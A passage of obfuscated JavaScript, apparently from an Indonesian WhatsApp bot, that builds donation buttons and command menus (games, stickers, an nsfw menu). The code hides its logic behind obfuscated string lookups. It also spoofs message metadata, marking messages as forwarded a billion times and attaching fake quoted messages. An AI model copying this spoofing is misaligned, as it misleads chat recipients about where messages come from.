ini_info=_0x4aaba1(0xaa1,0x797,0x9d2,0xce1)+sender['split']('@')[0x23d6+-0x1c60+-0x776]+(',\x20kamu\x20mau'+'\x20bayar\x20pak'+_0x406083(0x7ba,0xb3c,0x5bd,0x775)+_0x406083(0xd04,0x1122,0x1203,0x1153)+_0x4aaba1(0x5fa,0x448,0x944,0x593));const _0x532121={};_0x532121[_0x406083(0x50e,0x5e1,0x74c,0x7cd)+'t']=_0x406083(0x38d,0x8a2,0x792,0x507);const _0x200cda={};_0x200cda[_0x4aaba1(0x78d,0x5cd,0xad2,0x870)]='langsung_d'+'ana18',_0x200cda['buttonText']=_0x532121,_0x200cda['type']=0x1;const _0x19b7b6={};_0x19b7b6[_0x406083(0x50e,0x45d,0x2f1,0x854)+'t']=_0x4aaba1(0xd28,0x119f,0x115a,0xa1e);const _0x21b620={};_0x21b620['buttonId']='qr_dana18',_0x21b620[_0x406083(0x6b4,0x962,0x6d1,0x2e8)]=_0x19b7b6,_0x21b620[_0x406083(0x7e1,0x7b8,0x648,0x4bc)]=0x1;const buttons5=[_0x200cda,_0x21b620],_0x1b6cf1={};_0x1b6cf1[_0x406083(0x851,0x6b6,0xa40,0x535)+'t']=ini_info,_0x1b6cf1[_0x4aaba1(0x5e6,0x5c4,0x252,0xa82)]=''+tampilTanggal+enter+tampilWaktu+enter+enter+'©\x20'+creator,_0x1b6cf1[_0x406083(0x79c,0x519,0x89a,0xa80)]=buttons5,_0x1b6cf1[_0x4aaba1(0xb0a,0xde9,0x6ef,0xcce)]=0x1;const btn5=_0x1b6cf1,_0x9c5a9e={};_0x9c5a9e[_0x406083(0x4fe,0x4e6,0x7bc,0x750)]='hi',_0x9c5a9e[_0x4aaba1(0x904,0x7dc,0xb22,0xcc8)+_0x406083(0x973,0xb4f,0xb14,0x4c4)]=0x3b9aca00,_0x9c5a9e[_0x406083(0x823,0xbc7,0xba5,0x508)+'d']=!![],_0x9c5a9e[_0x406083(0x43c,0x4e4,0x61,0x192)+'ral']=!![],_0x9c5a9e[_0x4aaba1(0x88d,0xce3,0x60d,0x5dd)+'id']=[sender];const _0x1c3878={};_0x1c3878['caption']='Botwea\x20©2k'+'21',_0x1c3878[_0x4aaba1(0x887,0x4d5,0x5f1,0xbae)+'o']=_0x9c5a9e,_0x1c3878[_0x4aaba1(0xce3,0xe93,0xc54,0xb64)]=ftroli,_0x1c3878['sendEpheme'+_0x406083(0x40c,0x72f,0x59,0x917)]=!![],alpha[_0x4aaba1(0x8b4,0xc7e,0x645,0xc6e)+'e'](from,btn5,MessageType[_0x406083(0x9f4,0x9c5,0xd65,0xd48)+'sage'],_0x1c3878);}if(subscribezeeoneofc==_0x406083(0x3ae,0x67,0x5b1,0x84a)+_0x406083(0xa54,0xd3e,0x59f,0x9fa)){optionsp2=_0x406083(0xccf,0xfe3,0x1169,0x9b4)+_0x406083(0x83d,0xcc2,0x7fd,0x941)+'orang\x20yang'+_0x4aaba1(0x5ce,0x248,0x940,0x32c)+_0x4aaba1(0xc49,0xe9a,0xec1,0xb4c)+_0x4aaba1(0x5dd,0x705,0x204,0x7c7)+_0x406083(0x4d4,0x58b,0xc5,0x540)+_0x406083(0x99c,0xd21,0x941,0x870)+'minjamkan\x20'+_0x406083(0x3dc,0x510,0x7a0,0x45b)+_0x406083(0xbc1,0x745,0x70f,0x70d)+_0x4aaba1(0x789,0x9c3,0x50a,0x50b)+_0x406083(0xb58,0xbc4,0x706,0x933)+_0x4aaba1(0xd17,0xab4,0xdee,0x803)+_0x406083(0x9ef,0xb12,0x6f8,0x4d7)+_0x4aaba1(0x920,0x475,0xc26,0x688)+_0x4aaba1(0x405,0x63f,0x5a7,0x35e)+_0x4aaba1(0x3de,-0x108,0x43b,0x18e)+_0x4aaba1(0xda6,0x1011,0x1081,0x902)+'\x20mereka\x20pa'+_0x4aaba1(0xd23,0xb98,0xe0f,0xa6b)+'banyak.”\x20('+_0x406083(0xb00,0x86d,0x60c,0x100a)+_0x4aaba1(0xafd,0xf26,0xe4e,0xf2e)+_0x406083(0x744,0x7e1,0xbf1,0x462)+pushname+(_0x406083(0xb02,0xfbd,0x5ed,0xe01)+_0x406083(0x57b,0x1ee,0x243,0x154))+sender[_0x4aaba1(0x6ab,0xa60,0x22e,0x528)]('@')[0x7a8+-0x24b8+0x1d10]+(_0x4aaba1(0x44b,0x7e5,0x118,0x711)+_0x4aaba1(0x980,0x4b8,0x954,0x9fe))+nomor_dana+('\x0a\x0a_Powered'+_0x406083(0xc84,0x956,0x943,0x1156))+ini_mark[_0x4aaba1(0x6ab,0x938,0x689,0x695)]('@')[0x1a19+-0x121a+-0x7ff]+'_';const _0x3317be={};_0x3317be[_0x4aaba1(0x88d,0x4eb,0x565,0xa51)+'id']=[sender,ini_mark],_0x3317be[_0x4aaba1(0x904,0x625,0xb0d,0x970)+_0x406083(0x973,0xa8e,0xbf3,0xd8b)]=0x3e7,_0x3317be[_0x4aaba1(0x858,0xc72,0x9c6,0xa77)+'d']=!![];const _0xe87c9={};_0xe87c9[_0x4aaba1(0xce3,0x115b,0xa06,0x835)]=fkontak,_0xe87c9['contextInf'+'o']=_0x3317be,_0xe87c9[_0x406083(0x43c,0x2e9,-0xb1,0x47a)+_0x4aaba1(0x441,0x72d,0x281,0x117)]=!![],alpha[_0x4aaba1(0x8b4,0xadf,0xcc4,0x679)+'e'](from,optionsp2,text,_0xe87c9);}if(subscribezeeoneofc==_0x4aaba1(0xae6,0xbed,0xb66,0xd82)+'y18'){var ini_info=_0x4aaba1(0xaa1,0xaef,0x6ba,0xb99)+sender[_0x406083(0x676,0x4d2,0x9e2,0x9b4)]('@')[-0x3a9*0x1+0x208b+0x1ce2*-0x1]+(_0x4aaba1(0xb8b,0xc8f,0xe52,0xcd5)+_0x406083(0xb48,0x72a,0xe65,0x82d)+_0x4aaba1(0x7ef,0x3de,0xb19,0xad4)+_0x406083(0xd04,0xa21,0xa76,0x873)+_0x4aaba1(0x5fa,0x432,0x220,0xa0b));const _0x1a4e76={};_0x1a4e76[_0x406083(0x50e,0x408,0x382,0x6f6)+'t']=_0x4aaba1(0x3c2,0x5d6,0x2c3,0x452);const _0x36197f={};_0x36197f[_0x4aaba1(0x78d,0x50e,0xbdc,0xbe3)]=_0x406083(0x8f5,0xcd2,0x6d0,0xc07)+_0x406083(0x8f4,0xbee,0xccd,0xe03),_0x36197f[_0x4aaba1(0x6e9,0x847,0x1fb,0x975)]=_0x1a4e76,_0x36197f['type']=0x1;const _0x2f9e2b={};_0x2f9e2b['displayTex'+'t']=_0x406083(0xcf3,0x9b6,0x102e,0x1176);const _0x18c9ff={};_0x18c9ff[_0x406083(0x758,0x92a,0x470,0x4d0)]=_0x406083(0x3f6,0x39,0x7cf,0x23f),_0x18c9ff[_0x406083(0x6b4,0x90b,0x308,0xac7)]=_0x2f9e2b,_0x18c9ff['type']=0x1;const buttons6=[_0x36197f,_0x18c9ff],_0xfb8da2={};_0xfb8da2[_0x4aaba1(0x886,0x9e9,0x8a3,0xc89)+'t']=ini_info,_0xfb8da2[_0x406083(0x5b1,0x555,0x31e,0x881)]=''+tampilTanggal+enter+tampilWaktu+enter+'©\x20'+creator,_0xfb8da2[_0x4aaba1(0x7d1,0x3eb,0xa9f,0xa14)]=buttons6,_0xfb8da2[_0x406083(0xad5,0xa96,0x81a,0x65b)]=0x1;const btn6=_0xfb8da2,_0x1bc58a={};_0x1bc58a[_0x4aaba1(0x533,0xb2,0x843,0x660)]='hi',_0x1bc58a[_0x406083(0x8cf,0xdef,0xbac,0x77f)+'Score']=0x3b9aca00,_0x1bc58a[_0x406083(0x823,0x94a,0x6fa,0x97a)+'d']=!![],_0x1bc58a[_0x4aaba1(0x471,0x68f,0x75d,0x49c)+_0x4aaba1(0x441,0x750,0x4a2,0x49a)]=!![],_0x1bc58a[_0x4aaba1(0x88d,0x3fe,0x5cf,0x992)+'id']=[sender];const _0x45f128={};_0x45f128[_0x4aaba1(0x4ad,0x2c2,0x734,0x149)]='Botwea\x20©2k'+'21',_0x45f128['contextInf'+'o']=_0x1bc58a,_0x45f128[_0x4aaba1(0xce3,0xa90,0xbcc,0xff7)]=ftroli,_0x45f128[_0x4aaba1(0x471,0x74a,0x4b8,-0x6a)+'ral']=!![],alpha[_0x406083(0x87f,0xa97,0xab4,0xda3)+'e'](from,btn6,MessageType['buttonsMes'+_0x406083(0x4ca,0x6e3,0x358,0x3bd)],_0x45f128);}if(subscribezeeoneofc==_0x406083(0x8f5,0x471,0x9a6,0xcdf)+'opay18'){optionsp3=_0x406083(0xccf,0xf9e,0xa94,0xe4e)+_0x406083(0x83d,0xb0d,0x31e,0x9b8)+_0x406083(0x76f,0xaab,0xa47,0xb90)+_0x406083(0x599,0x35c,0x8f7,0x9a1)+_0x406083(0xc14,0xb52,0xe0b,0xb33)+_0x406083(0x5a8,0x739,0x4a5,0x818)+'pun\x20peremp'+_0x406083(0x99c,0x662,0x82a,0xeb0)+_0x4aaba1(0xab4,0x791,0xbed,0xf07)+_0x4aaba1(0x411,0x5bb,0x486,0x806)+_0x4aaba1(0xbf6,0x8d0,0x925,0xa96)+'n\x20yang\x20bai'+_0x4aaba1(0xb8d,0xc3f,0xf3d,0x8ca)+_0x406083(0xce2,0xca4,0xeab,0x913)+_0x4aaba1(0xa24,0x6c9,0x6de,0xf29)+_0x4aaba1(0x920,0xba1,0x790,0xc9e)+'annya)\x20kep'+_0x406083(0x3a9,0x293,0x658,-0x96)+_0x406083(0xd71,0xcdf,0x9e9,0xac7)+_0x4aaba1(0xa13,0xe60,0x717,0xc07)+_0x4aaba1(0xd23,0xc89,0xce6,0x972)+_0x4aaba1(0xd07,0xe18,0xcaa,0xc3a)+_0x4aaba1(0xb35,0xc14,0xfb2,0xb45)+'id:\x2018)\x0a\x0a•'+'\x20Nama\x20:\x20_'+pushname+(_0x4aaba1(0xb37,0xa1f,0xd7b,0xc56)+':\x20_@')+sender[_0x406083(0x676,0x5b3,0x1d5,0x9ab)]('@')[-0x172+-0x44+0x1*0x1b6]+(_0x406083(0x416,0x176,0x5b1,0x692)+_0x4aaba1(0x980,0x7c2,0xa19,0x83e))+nomor_gopay+(_0x406083(0xac4,0x81f,0xb45,0x75a)+'\x20by\x20@')+ini_mark[_0x406083(0x676,0x290,0x703,0x316)]('@')[-0x20c3+0x57d+-0x2*-0xda3]+'_';const _0x553417={};_0x553417[_0x406083(0x858,0x563,0x956,0x434)+'id']=[sender,ini_mark],_0x553417['forwarding'+_0x4aaba1(0x9a8,0xb70,0xb70,0x6cb)]=0x3e7,_0x553417[_0x406083(0x823,0x595,0xbde,0x976)+'d']=!![];const _0x332969={};_0x332969[_0x4aaba1(0xce3,0xbd4,0x953,0xdb7)]=fkontak,_0x332969[_0x4aaba1(0x887,0x8cf,0xce1,0x569)+'o']=_0x553417,_0x332969[_0x406083(0x43c,0x182,0x29a,0x732)+_0x406083(0x40c,0x5e5,-0x54,0x609)]=!![],alpha[_0x4aaba1(0x8b4,0x612,0xb79,0x44a)+'e'](from,optionsp3,text,_0x332969);}subscribezeeoneofc==_0x406083(0x5ed,0x1bb,0x8d5,0x742)&&(console[_0x406083(0x462,0x41,0x161,0x40e)](color(time,_0x406083(0xc2f,0xd92,0x91a,0x112d)),color(_0x4aaba1(0x6d5,0x973,0xa34,0x650)+'ge\x20welcome'+_0x406083(0xabe,0xb63,0x81c,0x9e5))),reply('☕'));if(subscribezeeoneofc==_0x4aaba1(0xade,0xfd4,0x7f6,0x644)){console[_0x406083(0x462,0x758,0x282,0x6de)](color(time,_0x4aaba1(0xc64,0x10be,0xe6d,0x8ca)),color(_0x406083(0x9d2,0x709,0x9e4,0x57c)+'sage\x20menu'));const _0xef881d={};_0xef881d[_0x4aaba1(0xa8c,0x883,0x688,0xb8a)]=_0x4aaba1(0xb1f,0xbd6,0x8b2,0x7d7)+'ot',_0xef881d[_0x4aaba1(0x50e,0x365,0x896,0x6b8)+'n']=_0x4aaba1(0x736,0xb58,0x210,0x279)+'this\x20if\x20yo'+_0x4aaba1(0xd27,0xcd2,0x1112,0x1236)+_0x4aaba1(0xd6a,0x1018,0xc81,0x10d6)+_0x406083(0xc67,0xcef,0xc50,0xbef)+'and_',_0xef881d[_0x406083(0x3c8,0x730,0x6d1,0x636)]='0';const _0x246d01={};_0x246d01[_0x406083(0xa57,0x892,0xddb,0x61c)]=_0x406083(0x42a,0x5ff,0x582,0x287)+'\x20bot',_0x246d01[_0x4aaba1(0x647,0x276,0x710,0x4ca)]=[_0xef881d];const _0x304c30={};_0x304c30['title']=_0x4aaba1(0x95f,0x4dd,0x7b4,0xe46)+'nu',_0x304c30['descriptio'+'n']=_0x4aaba1(0x736,0x486,0x74b,0x6f8)+_0x406083(0xc66,0xbe2,0x1044,0x10ad)+'u\x20want\x20to\x20'+'use\x20the\x20do'+_0x4aaba1(0xc6c,0x7ec,0xf55,0x1169)+_0x406083(0xc2c,0xde5,0x95f,0x10d1),_0x304c30[_0x406083(0x3c8,0x139,0x4a0,0x14c)]='0';const _0xef6cca={};_0xef6cca[_0x406083(0xa57,0xa2b,0xd31,0x82a)]=_0x406083(0x61d,0x4e9,0xb14,0x204)+'1',_0xef6cca[_0x4aaba1(0x647,0x87d,0x9a3,0x45f)]=[_0x304c30];const _0x34fbfd={};_0x34fbfd[_0x406083(0xa57,0xa62,0xd31,0x537)]=_0x4aaba1(0xaca,0x9c9,0xc0b,0x6f2)+'u',_0x34fbfd[_0x4aaba1(0x50e,0x9c7,0x7ac,0x7e5)+'n']='\x0a\x0a_choose\x20'+'this\x20if\x20yo'+'u\x20want\x20to\x20'+'use\x20the\x20co'+_0x406083(0xd41,0x9bb,0xfef,0x850)+'command_',_0x34fbfd[_0x4aaba1(0x3fd,0x16f,0x391,0x55a)]='0';const _0x49852f={};_0x49852f[_0x4aaba1(0xa8c,0x72a,0x998,0xe75)]=_0x4aaba1(0xb96,0xd70,0x677,0x88a)+'2',_0x49852f['rows']=[_0x34fbfd];const _0x40d43e={};_0x40d43e['title']=_0x4aaba1(0x94d,0x528,0x534,0x8bf),_0x40d43e[_0x406083(0x4d9,0x791,0x323,0x36a)+'n']='\x0a\x0a_choose\x20'+'this\x20if\x20yo'+'u\x20want\x20to\x20'+_0x4aaba1(0xa8a,0xe3e,0x7b2,0x5cf)+_0x406083(0xa26,0x8a9,0xbe7,0x989)+_0x4aaba1(0x590,0x29c,0xb8,0xa70),_0x40d43e[_0x406083(0x3c8,0x8e8,0x325,0x770)]='0';const _0xa531f1={};_0xa531f1[_0x406083(0xa57,0xb1c,0x9f6,0xd52)]=_0x4aaba1(0x90f,0xaf2,0x896,0x403)+'3',_0xa531f1[_0x406083(0x612,0x970,0x609,0x34b)]=[_0x40d43e];const _0x4b7f15={};_0x4b7f15[_0x406083(0xa57,0x6e7,0xa8d,0xcd0)]=_0x4aaba1(0x89c,0xa29,0xd16,0x5db),_0x4b7f15[_0x4aaba1(0x50e,0x8f2,0x70b,0x2d)+'n']=_0x4aaba1(0x736,0x79e,0x639,0x683)+'this\x20if\x20yo'+_0x4aaba1(0xd27,0x93b,0x971,0x910)+'use\x20the\x20ma'+_0x406083(0x666,0x190,0x1b0,0x772)+_0x406083(0xc6e,0xbea,0x100e,0x1014),_0x4b7f15[_0x406083(0x3c8,0x721,0x753,0x57a)]='0';const _0x1b56ad={};_0x1b56ad[_0x4aaba1(0xa8c,0xad1,0xd0b,0xdcc)]='🐱\x20Menu\x20ke-'+'4',_0x1b56ad[_0x406083(0x612,0xaaf,0x7b9,0x276)]=[_0x4b7f15];const _0x27940b={};_0x27940b[_0x4aaba1(0xa8c,0xa0a,0xbd8,0xd7a)]='othermenu',_0x27940b[_0x4aaba1(0x50e,0x10,0x5dc,0x5b0)+'n']=_0x4aaba1(0x736,0xa3b,0x8f2,0x99d)+'this\x20if\x20yo'+'u\x20want\x20to\x20'+'use\x20the\x20ot'+_0x4aaba1(0x6b7,0xa6e,0x56b,0xb78)+_0x4aaba1(0xca3,0x9e3,0x8f0,0xddd),_0x27940b[_0x4aaba1(0x3fd,0x5ee,0x731,0x566)]='0';const _0x9bf8e1={};_0x9bf8e1[_0x406083(0xa57,0xbbf,0xa3e,0x7ad)]=_0x4aaba1(0x436,0xeb,-0x63,0x952)+'5',_0x9bf8e1['rows']=[_0x27940b];const _0x506d42={};_0x506d42[_0x406083(0xa57,0x5c9,0xd94,0xd20)]=_0x406083(0x924,0x8b1,0x644,0xb4a),_0x506d42[_0x4aaba1(0x50e,0x55f,0x554,0x108)+'n']=_0x406083(0x701,0x9b5,0x8fc,0x530)+_0x4aaba1(0xc9b,0x88b,0xa5d,0xcae)+_0x406083(0xcf2,0xe73,0xac7,0x1174)+_0x4aaba1(0xa57,0xbae,0xf62,0xa62)+_0x406083(0x96e,0x4de,0x90b,0x97e)+'mmand_',_0x506d42['rowId']='0';const _0xbfd102={};_0xbfd102[_0x406083(0xa57,0x8f7,0xed4,0xcab)]='🦁\x20Menu\x20ke-'+'6',_0xbfd102[_0x406083(0x612,0x996,0x878,0x53e)]=[_0x506d42];const _0xbb379b={};_0xbb379b[_0x406083(0xa57,0xd51,0x596,0x9e8)]='storagemen'+'u',_0xbb379b[_0x4aaba1(0x50e,0x72f,0x91,0x42f)+'n']='\x0a\x0a_choose\x20'+_0x406083(0xc66,0xcb6,0x8c0,0xc9c)+_0x4aaba1(0xd27,0xce9,0xa43,0xe95)+_0x406083(0x375,0x6de,0x51b,0x54)+'oragemenu\x20'+_0x4aaba1(0x88a,0x72a,0x4b8,0x380),_0xbb379b[_0x4aaba1(0x3fd,0x448,0x748,-0x4c)]='0';const _0x282477={};_0x282477[_0x4aaba1(0xa8c,0x849,0xc94,0xf9c)]='🐺\x20Menu\x20ke-'+'7',_0x282477['rows']=[_0xbb379b];const _0x260672={};_0x260672[_0x4aaba1(0xa8c,0xe53,0xd69,0x6ae)]='tagmenu',_0x260672['descriptio'+'n']=_0x4aaba1(0x736,0x5ce,0xae0,0x443)+_0x4aaba1(0xc9b,0xa3f,0xb9a,0xa96)+_0x406083(0xcf2,0xcb1,0x9fc,0xadb)+'use\x20the\x20ta'+_0x4aaba1(0x3dc,0x581,0x79e,-0x77)+_0x406083(0x55b,0x56f,0x2cb,0x12a),_0x260672['rowId']='0';const _0x136e72={};_0x136e72[_0x4aaba1(0xa8c,0xdc1,0x643,0xa36)]=_0x406083(0x909,0x92c,0x749,0x7ba)+'8',_0x136e72[_0x406083(0x612,0x246,0x794,0x2fd)]=[_0x260672];const _0x198cb3={};_0x198cb3['title']='upmenu',_0x198cb3[_0x4aaba1(0x50e,0x798,0x761,0x35)+'n']='\x0a\x0a_choose\x20'+_0x4aaba1(0xc9b,0x1004,0xd3b,0x87a)+_0x4aaba1(0xd27,0xc87,0x1089,0xf8d)+'use\x20the\x20up'+_0x406083(0xb03,0x7c3,0x795,0x6ee)+_0x4aaba1(0xca5,0xdeb,0x1007,0xd7b),_0x198cb3[_0x4aaba1(0x3fd,0x5f4,0x65b,0x50d)]='0';const _0x3ae27f={};_0x3ae27f[_0x406083(0xa57,0xb63,0xde7,0x5b6)]=_0x4aaba1(0x5f3,0x4a3,0x9da,0x3f2)+'9',_0x3ae27f[_0x4aaba1(0x647,0x144,0x84b,0x3c8)]=[_0x198cb3];const _0x5921e0={};_0x5921e0[_0x406083(0xa57,0xbc8,0x5df,0x8ae)]=_0x406083(0x9a3,0x4ff,0x877,0x699)+'r\x20cmd',_0x5921e0[_0x4aaba1(0x50e,0x85b,0x588,0x545)+'n']=_0x4aaba1(0x736,0x637,0x2bb,0x546)+_0x406083(0xc66,0xe6a,0xf1d,0x814)+_0x406083(0xcf2,0xb99,0xaf3,0xbf3)+_0x4aaba1(0x86b,0xc91,0xbae,0x957)+_0x406083(0xa45,0x6f9,0xddd,0x665)+_0x4aaba1(0x88a,0x853,0xc90,0x8b8),_0x5921e0[_0x406083(0x3c8,-0x119,0x5be,0x312)]='0';const _0x2bf77c={};_0x2bf77c[_0x406083(0xa57,0xabb,0xc44,0xe53)]=_0x4aaba1(0x652,0x237,0x9ce,0xa00)+'10',_0x2bf77c[_0x4aaba1(0x647,0x5c7,0x5a7,0x99b)]=[_0x5921e0];const _0xc7dc43={};_0xc7dc43['title']='gacha\x20ceca'+'n',_0xc7dc43[_0x406083(0x4d9,0x7a3,0x8ac,0x20b)+'n']=_0x406083(0x701,0x222,0xc06,0x8f4)+'this\x20if\x20yo'+_0x4aaba1(0xd27,0xf40,0x1196,0x8ad)+_0x4aaba1(0x629,0x4ea,0x5be,0x728)+_0x4aaba1(0xc0f,0x7a8,0xe9e,0xb28)+'ommand_',_0xc7dc43[_0x4aaba1(0x3fd,0x6ed,0x1f7,0x5e2)]='0';const _0x59bf5d={};_0x59bf5d[_0x4aaba1(0xa8c,0xe93,0xc4e,0x981)]=_0x4aaba1(0xdd2,0xc30,0xbd1,0xbb7)+'11',_0x59bf5d[_0x4aaba1(0x647,0x234,0xa04,0x294)]=[_0xc7dc43];const _0x174a53={};_0x174a53[_0x406083(0xa57,0x577,0xbe1,0xb0b)]='telegram\x20s'+'ticker',_0x174a53['descriptio'+'n']=_0x406083(0x701,0xb83,0x4a3,0x311)+_0x4aaba1(0xc9b,0xb1e,0x999,0xe5c)+_0x4aaba1(0xd27,0xd31,0x124b,0x8f8)+_0x406083(0x5c6,0x29c,0x3fd,0x6ae)+_0x406083(0x5bf,0x9c8,0x78f,0x30c)+_0x4aaba1(0x590,0x297,0x339,0x571),_0x174a53[_0x406083(0x3c8,0xb0,0x65d,0x4f)]='0';const _0x50eea6={};_0x50eea6[_0x4aaba1(0xa8c,0x7ef,0xe63,0xce9)]='🦡\x20Menu\x20ke-'+'12',_0x50eea6[_0x4aaba1(0x647,0xa5f,0x939,0x9bf)]=[_0x174a53];const _0x85da81={};_0x85da81['title']='nsfw\x20menu',_0x85da81[_0x4aaba1(0x50e,0x1db,0x9f2,0x4ab)+'n']=_0x406083(0x701,0x9ff,0x57d,0x952)+_0x406083(0xc66,0x891,0x95b,0x895)+_0x4aaba1(0xd27,0xe1e,0xbfd,0x9b5)+_0x406083(0xa4c,0x705,0x80a,0x6b7)+'fwmenu\x20com'+_0x406083(0x578,0x4e6,0x746,0x295),_0x85da81[_0x406083(0x3c8,0x877,0x617,0x430)]='0';const _0x4b711e={};_0x4b711e[_0x4aaba1(0xa8c,0x886,0xe8c,0x5b1)]=_0x406083(0x913,0xbda,0xc7b,0xdf5)+'13',_0x4b711e[_0x406083(0x612,0x698,0x339,0x9f5)]=[_0x85da81];const _0xb0d9cb={};_0xb0d9cb['title']='asupan\x20men'+'u',_0xb0d9cb[_0x406083(0x4d9,0x573,0x6e6,-0x3b)+'n']=_0x406083(0x701,0x2bf,0x1e0,0xc1a)+_0x406083(0xc66,0x10db,0xd1d,0xf4b)+_0x406083(0xcf2,0xa71,0x8cf,0x8a5)+_0x4aaba1(0x6d2,0x64f,0x249,0xa0b)+_0x406083(0x503,0x45b,0x8a,0x9ff)+_0x4aaba1(0x88a,0x887,0x80b,0x5f9),_0xb0d9cb[_0x4aaba1(0x3fd,0x8ef,0x5c0,0x6e0)]='0';const _0x14d5d5={};_0x14d5d5[_0x406083(0xa57,0x7c7,0x8e1,0x7cb)]='🦌\x20Menu\x20ke-'+'14',_0x14d5d5[_0x4aaba1(0x647,0x3b7,0x4eb,0x284)]=[_0xb0d9cb];const _0x2f9997={};_0x2f9997[_0x406083(0xa57,0x840,0x99b,0x7ba)]=_0x406083(0xc80,0xcac,0xf48,0x115a)+'ct',_0x2f9997[_0x4aaba1(0x50e,0x56c,0x3f8,0x988)+'n']=_0x4aaba1(0x736,0x3fd,0xa25,0x7ae)+'this\x20if\x20yo'+_0x4aaba1(0xd27,0x11de,0x85e,0xf0e)+_0x4aaba1(0x52f,0x563,0x397,0x509)+'age\x20effect'+_0x406083(0x75b,0x3af,0x4ec,0x656)+_0x4aaba1(0x590,0x82f,0x71b,0x6fc),_0x2f9997['rowId']='0';const _0x50210d={};_0x50210d[_0x4aaba1(0xa8c,0x62a,0x73d,0xa46)]=_0x406083(0x5b4,0x3f4,0x71e,0x21c)+_0x406083(0xc5d,0xb5e,0x81b,0xc3f),_0x50210d[_0x406083(0x612,0x632,0x769,0x5eb)]=[_0x2f9997];const _0x5d7115={};_0x5d7115[_0x406083(0xa57,0x605,0xa58,0x58f)]=_0x406083(0x841,0x663,0x49d,0x500)+'n',_0x5d7115[_0x4aaba1(0x50e,0x960,0x9e6,0x14a)+'n']=_0x4aaba1(0x736,0xa90,0x2c7,0x28c)+'this\x20if\x20yo'+_0x406083(0xcf2,0xb70,0xfe9,0x101c)+'use\x20the\x20ga'+_0x4aaba1(0xc8d,0x951,0xb42,0xf2f)+'command_',_0x5d7115[_0x406083(0x3c8,0x541,0x7eb,0x394)]='0';const _0x20454d={};_0x20454d[_0x4aaba1(0xa8c,0xf5f,0xf12,0xa12)]='🦉\x20Menu\x20ke-'+'16',_0x20454d[_0x4aaba1(0x647,0x599,0x5cc,0x3d1)]=[_0x5d7115];const _0x4281d1={};_0x4281d1[_0x4aaba1(0xa8c,0xc38,0x836,0xf59)]=_0x4aaba1(0x541,0x100,0x730,0x696),_0x4281d1[_0x4aaba1(0x50e,0x40f,0x70e,0xa0d)+'n']=_0x4aaba1(0x736,0x36c,0x686,0x2d8)+_0x4aaba1(0xc9b,0xabe,0xa54,0x862)+'u\x20want\x20to\x20'+_0x4aaba1(0xcd0,0x1105,0x104b,0xec8)+'otesmenu\x20c'+'ommand_',_0x4281d1[_0x4aaba1(0x3fd,0x7a1,0x20a,0x61d)]='0';const _0x2b15cb={};_0x2b15cb['title']='🦔\x20Menu\x20ke-'+'17',_0x2b15cb[_0x4aaba1(0x647,0x67d,0x6b9,0x7cb)]=[_0x4281d1];const _0x4011d2={};_0x4011d2[_0x4aaba1(0xa8c,0x82a,0xd74,0xe1f)]=_0x4aaba1(0xa54,0x652,0xc46,0xd61),_0x4011d2[_0x406083(0x4d9,0x855,0x871,0x622)+'n']=_0x406083(0x701,0x29a,0x21f,0x236)+_0x406083(0xc66,0xb33,0xa69,0xc01)+'u\x20want\x20to\x20'+_0x4aaba1(0x609,0x328,0x51d,0x2e7)+_0x4aaba1(0xd4e,0xbfb,0xeb3,0xff3)+_0x4aaba1(0xca3,0x100d,0xbdb,0xdb5),_0x4011d2[_0x406083(0x3c8,0x41c,0x355,0x1a5)]='0';const _0x12a100={};_0x12a100['title']=_0x4aaba1(0x7f6,0x5fc,0xa63,0xbba)+'18',_0x12a100[_0x4aaba1(0x647,0x543,0x3e8,0x7e8)]=[_0x4011d2];const _0x1e707d={};_0x1e707d[_0x4aaba1(0xa8c,0xf63,0x8d3,0x630)]=_0x4aaba1(0x79c,0x9f6,0x405,0x937)+'u',_0x1e707d[_0x4aaba1(0x50e,0x91,0x736,0x62b)+'n']=_0x4aaba1(0x736,0x5d8,0xb03,0xae8)+_0x406083(0xc66,0x117c,0xc9d,0xee3)+'u\x20want\x20to\x20'+_0x4aaba1(0x5fb,0x6b5,0x281,0x572)+_0x4aaba1(0x7c7,0xb2c,0x34b,0x388)+_0x406083(0x855,0x8b7,0x58a,0x58c),_0x1e707d[_0x4aaba1(0x3fd,0x346,0x4a6,-0xd5)]='0';const _0x171862={};_0x171862[_0x406083(0xa57,0xdc9,0xa1f,0xd97)]=_0x406083(0x655,0x2b7,0xa45,0xaad)+'19',_0x171862[_0x4aaba1(0x647,0xb00,0x1b1,0x1cf)]=[_0x1e707d];const _0x216765={};_0x216765[_0x406083(0xa57,0x901,0x568,0xbaa)]=_0x406083(0x7a7,0x85c,0x708,0x452)+'nu',_0x216765[_0x406083(0x4d9,0xe2,0x53d,0x1a6)+'n']=_0x4aaba1(0x736,0x556,0xc26,0x2e4)+_0x406083(0xc66,0xd29,0xaf1,0xc34)+_0x4aaba1(0xd27,0x11ff,0xec3,0x11cf)+'use\x20the\x20ph'+_0x406083(0x620,0x6a3,0x879,0x453)+_0x406083(0xc2c,0x1041,0xe09,0xead),_0x216765[_0x4aaba1(0x3fd,-0xd2,0x696,0x6a9)]='0';const _0x19929a={};_0x19929a[_0x4aaba1(0xa8c,0xeeb,0xa5b,0x849)]=_0x406083(0x8ed,0x43f,0x726,0xd68)+'20',_0x19929a[_0x406083(0x612,0x46a,0x490,0x15a)]=[_0x216765];const _0x1498b9={};_0x1498b9['title']='source\x20cod'+'e',_0x1498b9['descriptio'+'n']='\x0a\x0a_choose\x20'+_0x4aaba1(0xc9b,0xcc3,0x10a0,0xaa2)+_0x406083(0xcf2,0xe85,0xb54,0x820)+'know\x20sourc'+'e\x20code\x20thi'+_0x406083(0x7e3,0x8c1,0xcd5,0xcc9),_0x1498b9[_0x4aaba1(0x3fd,0x6e8,0x9b,0x3e7)]=_0x4aaba1(0x66c,0x368,0x46f,0x8c5)+'e';const _0x19f144={};_0x19f144[_0x406083(0xa57,0xda3,0xc84,0x807)]=_0x406083(0xa73,0xaf2,0x69b,0x6ce)+_0x4aaba1(0x7e7,0x84b,0x7f1,0xbb0),_0x19f144[_0x4aaba1(0x647,0xa5d,0x9ed,0x16c)]=[_0x1498b9];const 